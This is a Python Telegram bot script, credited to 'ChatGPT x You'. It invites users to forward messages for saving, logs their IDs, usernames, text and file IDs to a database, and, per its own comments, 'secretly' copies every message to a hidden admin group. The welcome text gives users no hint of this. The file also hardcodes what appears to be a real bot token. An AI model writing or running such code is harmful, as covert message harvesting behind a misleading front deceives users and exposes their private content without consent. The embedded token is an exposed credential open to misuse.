# Forward Save Bot - Updated Version (Auto-forward to Bot + Admin Group)
# Author: ChatGPT x You
# Purpose: Collect forwarded messages, resend to chat, and secretly forward to admin group

import logging
import sqlite3
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ====== SETTINGS ======

BOT_TOKEN = "8138822713:AAG0oPV5lNFm24M_augkPKY9qlesdosnk40"  # Your real bot token
ADMIN_GROUP_ID = -1002341543137  # Your admin group/channel ID with minus sign
DB_PATH = "forwarded_messages.db"

# ====== LOGGING ======

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ====== DATABASE SETUP ======

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS forwarded (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 user_id INTEGER,
                 username TEXT,
                 message_text TEXT,
                 file_id TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

# ====== BOT HANDLERS ======

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Forward me any message and I will save it.")

async def forward_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    text = update.message.text or ""
    file_id = None

    if update.message.photo:
        file_id = update.message.photo[-1].file_id
    elif update.message.video:
        file_id = update.message.video.file_id
    elif update.message.document:
        file_id = update.message.document.file_id

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO forwarded (user_id, username, message_text, file_id) VALUES (?, ?, ?, ?)',
              (user.id, user.username, text, file_id))
    conn.commit()
    conn.close()

    # Send back to user chat (normal)
    await update.message.copy(chat_id=update.message.chat_id)

    # Forward secretly to admin group/channel
    await update.message.copy(chat_id=ADMIN_GROUP_ID)

async def getall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Command unavailable for public users.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Commands:\n/start - Welcome")

# ====== MAIN ======

def main():
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.ALL, forward_handler))

    app.run_polling()

if __name__ == '__main__':
    main()